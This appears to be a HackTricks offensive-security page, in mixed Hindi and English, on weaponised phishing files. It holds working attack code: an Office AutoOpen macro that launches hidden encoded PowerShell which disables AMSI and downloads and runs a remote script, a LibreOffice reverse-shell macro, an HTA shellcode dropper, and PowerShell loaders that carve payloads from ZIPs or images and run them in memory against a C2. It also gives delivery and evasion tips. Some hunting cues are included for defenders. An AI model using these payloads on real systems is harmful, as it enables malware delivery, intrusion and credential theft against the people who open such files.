# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word फ़ाइल खोलने से पहले फ़ाइल डेटा validation करता है। Data validation data structure identification के रूप में किया जाता है, OfficeOpenXML standard के खिलाफ। अगर data structure identification के दौरान कोई error होता है, तो analysed की जा रही फ़ाइल नहीं खोली जाएगी।

आमतौर पर, macros वाली Word files `.docm` extension का उपयोग करती हैं। हालांकि, फ़ाइल extension बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उनकी macro executing capabilities बनी रहती हैं।\
उदाहरण के लिए, RTF file design के अनुसार macros support नहीं करती, लेकिन RTF में renamed की गई DOCM file Microsoft Word द्वारा handle की जाएगी और macro execution में सक्षम होगी।\
यही internals और mechanisms Microsoft Office Suite के सभी software (Excel, PowerPoint आदि) पर लागू होते हैं।

आप निम्न command का उपयोग करके यह check कर सकते हैं कि कौन-सी extensions कुछ Office programs द्वारा execute की जाने वाली हैं:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

यह संभव है कि macros का उपयोग करके document से arbitrary code चलाया जाए।

#### Autoload functions

जितने अधिक common वे होंगे, उतनी ही अधिक संभावना होगी कि AV उन्हें detect करेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
ध्यान दें doubled quotes (`""`) string के अंदर – LibreOffice Basic इनका उपयोग literal quotes को escape करने के लिए करता है, इसलिए ऐसे payloads जो `...==""")` पर खत्म होते हैं, inner command और Shell argument दोनों को balanced रखते हैं।

Delivery tips:

- `.odt` के रूप में save करें और macro को document event से bind करें ताकि यह खुलते ही तुरंत fire हो जाए।
- `swaks` के साथ email करते समय, `--attach @resume.odt` use करें (`@` जरूरी है ताकि attachment के रूप में filename string नहीं, बल्कि file bytes भेजे जाएँ)। यह उन SMTP servers के against critical है जो validation के बिना arbitrary `RCPT TO` recipients accept करते हैं।

## HTA Files

HTA एक Windows program है जो **HTML और scripting languages (जैसे VBScript और JScript) को combine करता है**। यह user interface generate करता है और browser की security model की constraints के बिना एक "fully trusted" application के रूप में execute होता है।

HTA को **`mshta.exe`** का उपयोग करके execute किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, इसलिए **`mshta` IE पर depend करता है**। इसलिए अगर इसे uninstall कर दिया गया हो, तो HTAs execute नहीं हो पाएँगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

NTLM authentication को **"remotely" force** करने के कई तरीके हैं, उदाहरण के लिए, आप ईमेल या HTML में **invisible images** जोड़ सकते हैं जिन्हें user access करेगा (even HTTP MitM?). या victim को **files के addresses** भेज सकते हैं जो **folder खोलते ही** एक **authentication** **trigger** करेंगे।

**इन ideas और अधिक के लिए निम्न pages देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप सिर्फ hash या authentication steal ही नहीं कर सकते, बल्कि **NTLM relay attacks** भी **perform** कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Highly effective campaigns एक ZIP deliver करते हैं जिसमें दो legitimate decoy documents (PDF/DOCX) और एक malicious .lnk होता है। Trick यह है कि actual PowerShell loader ZIP के raw bytes में एक unique marker के बाद stored होता है, और .lnk उसे carve करके पूरी तरह memory में run करता है।

.lnk PowerShell one-liner द्वारा implemented typical flow:

1) Original ZIP को common paths में locate करें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory के parent में।
2) ZIP bytes पढ़ें और एक hardcoded marker (e.g., xFIQCV) खोजें। Marker के बाद की सारी content embedded PowerShell payload होती है।
3) ZIP को %ProgramData% में copy करें, वहाँ extract करें, और decoy .docx खोलें ताकि legitimate लगे।
4) Current process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Next stage को deobfuscate करें (e.g., सभी # characters हटाएँ) और उसे memory में execute करें।

Embedded stage को carve और run करने के लिए example PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
टिप्पणियाँ
- Delivery अक्सर प्रतिष्ठित PaaS सबडोमेन (जैसे `*.herokuapp.com`) का दुरुपयोग करती है और payloads को gate कर सकती है (IP/UA के आधार पर benign ZIPs serve करती है)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और उसे Reflection.Emit + VirtualAlloc के जरिए execute करता है ताकि disk artifacts कम हों।

उसी chain में उपयोग की गई Persistence
- Microsoft Web Browser control का COM TypeLib hijacking, ताकि IE/Explorer या कोई भी app जो इसे embed करती है, payload को automatic फिर से launch करे। विवरण और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे `xFIQCV`) जुड़ी हो।
- `.lnk` जो parent/user folders enumerate करके ZIP locate करती है और एक decoy document खोलती है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के जरिए AMSI tampering।
- trusted PaaS domains के तहत hosted links के साथ समाप्त होने वाले लंबे-running business threads।

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

एक और बार-बार दिखने वाला pattern एक **document-impersonating `.lnk`** है, जो background में असली chain stage करते हुए तुरंत एक benign lure खोल देता है।

Observed workflow:
1. Shortcut **PDF का रूप धारण** करती है और obfuscated PowerShell downloader spawn करने के लिए `conhost.exe` या किसी similar proxy का उपयोग करती है।
2. PowerShell obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को fragment करता है, ताकि `iwr`, `gci`, `ren`, `cpi`, या `schtasks` खोजने वाली naive detections command को miss कर दें।
3. Stager पहले **decoy document** डाउनलोड करता है, victim के लिए उसे खोलता है, और फिर background में malicious files को reconstruct करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और फिर filler characters हटाकर rename किया जाता है, जिससे obvious `.exe` / `.cpl` artifacts का दिखना delay होता है।
5. Persistence एक **minute-based scheduled task** से स्थापित होती है जो user-writable path से एक trusted host binary launch करती है।

इस pattern से minimal hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
एक उपयोगी staging layout जिसे पहचानना चाहिए, यह है:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा stage stealthy क्यों है

Rapid7 case study में, scheduled task बार-बार **`Fondue.exe`** को `C:\Users\Public\` से लॉन्च कर रहा था। क्योंकि **`APPWIZ.cpl`** उसके साथ stage किया गया था और **`RunFODW`** export कर रहा था, trusted Microsoft binary ने legitimate system copy की बजाय attacker CPL को side-load किया।

फिर CPL ने:
- `C:\Windows\Tasks\editor.dat` से एक **AES-256-CBC** blob पढ़ा
- इसे **Windows CNG / `bcrypt.dll`** के माध्यम से decrypt किया
- executable memory allocate की और decrypted shellcode को copy किया
- इसे indirectly execute किया, shellcode pointer को **`EnumUILanguagesW`** के callback के रूप में pass करके

वह आख़िरी step अलग से hunt करने लायक है: malware अक्सर direct `((void(*)())buf)()` jump से बचता है और execution transfer करने के लिए **legitimate callback-taking WinAPI** का abuse करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने फिर final PE को पूरी तरह memory में map किया और current process में **AMSI/WLDP/ETW** को patch किया, execution hand off करने से पहले। side-loading और memory-resident post-processing पर deeper notes के लिए, देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` का `powershell.exe` या `conhost.exe` spawn करना, जिसके बाद एक visible decoy document हो।
- **`C:\Users\Public\`** में short-lived downloads, जिनके तुरंत बाद nonsense extensions से rename किया गया हो।
- `GoogleErrorReport` जैसे bland names वाले scheduled tasks जो **user-writable directories** से execute हों।
- Trusted binaries का same non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** के तहत लिखे गए Base64 text blobs, जिन्हें बाद में side-loaded module पढ़ता है।

## Images में Steganography-delimited payloads (PowerShell stager)

Recent loader chains एक obfuscated JavaScript/VBS deliver करते हैं जो Base64 PowerShell stager को decode और run करता है। वह stager एक image (अक्सर GIF) डाउनलोड करता है जिसमें Base64-encoded .NET DLL plain text के रूप में unique start/end markers के बीच छुपी होती है। Script इन delimiters को search करती है (wild में देखे गए examples: «<<sudo_png>> … <<sudo_odt>>>»), बीच का text निकालती है, उसे Base64-decode करके bytes में बदलती है, assembly को in-memory load करती है और C2 URL के साथ एक known entry method invoke करती है।

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64 decode करता है → -nop -w hidden -ep bypass के साथ PowerShell stager लॉन्च करता है।
- Stage 2: PowerShell stager → image डाउनलोड करता है, marker-delimited Base64 carve करता है, .NET DLL को in-memory load करता है और उसकी method (e.g., VAI) को C2 URL और options pass करके call करता है।
- Stage 3: Loader final payload retrieve करता है और आमतौर पर उसे process hollowing के जरिए एक trusted binary (commonly MSBuild.exe) में inject करता है। process hollowing और trusted utility proxy execution के बारे में यहाँ और देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है। Markers अभियानों के बीच बदलते रहते हैं।
- AMSI/ETW bypass और string deobfuscation आमतौर पर assembly लोड करने से पहले लागू किए जाते हैं।
- Hunting: ज्ञात delimiters के लिए डाउनलोड की गई images स्कैन करें; PowerShell को images access करते हुए और तुरंत Base64 blobs decode करते हुए पहचानें।

Stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखने वाला initial stage एक छोटी, बहुत अधिक obfuscated `.js` या `.vbs` होती है, जिसे archive के अंदर deliver किया जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और अगला stage HTTPS के जरिए bootstrap करने के लिए PowerShell को `-nop -w hidden -ep bypass` के साथ launch करना होता है।

Skeleton logic (abstract):
- अपनी file contents पढ़ें
- junk strings के बीच एक Base64 blob locate करें
- उसे ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` के साथ execute करें, जो `powershell.exe` invoke करे

Hunting cues
- Archived JS/VBS attachments जो command line में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn करें।
- `wscript.exe` का user temp paths से `powershell.exe -nop -w hidden` launch करना।

## Windows files to steal NTLM hashes

**places to steal NTLM creds** के बारे में page देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
